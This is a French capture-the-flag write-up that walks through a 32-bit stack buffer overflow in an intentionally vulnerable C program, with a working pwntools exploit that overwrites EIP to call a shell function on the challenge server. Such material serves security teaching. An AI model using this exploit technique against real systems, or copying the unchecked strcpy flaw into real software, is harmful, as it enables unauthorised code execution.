
# Write du challenge TheBigBertha


Sur ce challenge, nous avons un cas un peu plus poussé pour apprendre les buffers overflows.
Nous avons le code suivant:

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>


void shell(){

    setreuid(geteuid(),geteuid());
    system("/bin/bash");
}


void foo(char *msg){

    char buf[64];
    puts("Delta Charlie. Ordre bien reçu.");
    strcpy(buf,msg);
    printf("La cible est : %s\n", buf);
}

void init() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

int main(int argc, char **argv)
{
    init();
    puts("Entrez la cible :");
    char input[512];
    fgets(input, 511, stdin);
    if(strlen(input) > 1)
    {
        foo(input);
    }
    else{
 	puts("Veuillez entrer une chaine de caractères.");
    }

    printf("Programme is exiting normally ! \n");
    return 0;
}
```

Première chose à voir, nous avons une fonction qui fait apparaitre un shell, intéressant...
Deuxième chose à voir, nous avons une fonction foo() qui prend une entrée utilisateur MAIS qui ne vérifie pas la taille de l'entrée !
Le message de l'utilisateur "msg" est directement copié en mémoire avec la fonction standard C strcpy().
Notre faille est donc ici ! Voici le plan de bataille:
- Chercher à Overwrite le pointeur d'instruction (EIP) pour exécuter notre fonction shell().
- Trouver l'adresse de la fonction shell() dans le programme.
- Construire un payload avec pwntools !

**ETAPE 1:** Pour trouver de manière efficace le moment où on contrôle l'EIP, on peut utiliser la fonction "pattern create" disponible avec pwndbg, gef, ou gdb-peda.
Cette fonction permet de créer une grande chaine de caractère ce qui nous permettra de savoir quand on overwrite. Exemple:

$> pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'

$> r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
On voit cette ligne: EIP: 0x41344141 ('AA4A') donc on fait:

$> pattern offset AA4A
76

Dans notre cas, on trouve l'overwrite à 76.

**Etape 2:** Maintenant que nous avons l'offset à partir duquel nous pouvons controler EIP, nous allons chercher l'adresse de la fonction shell(). Cela peut se faire tout simplement dans un debugger avec la commande:
gdb-peda $> disass shell:
0x080491b6 <+0>:     push   ebp => Donc la fonction shell commence à 0x080491b6 

**Etape 3:** Kaboom !
Voici comment construire un payload en python avec pwntools:

```
from pwn import *

p = remote("challenge.nbctf.fr",1334) #Connexion au challenge

rop = b'A' * 76 #On créer notre chaine de caractère qui va provoquer un overflow.
rop += p32(0x080491b6) #On va chercher dans le binaire l'adresse de shell (Fonction très pratique de pwntools, s'il y a des symbols)

p.send(rop) #On envoit notre payload au programme
p.interactive() #On ouvre une session interactive pour aller lire le fichier password.txt

```



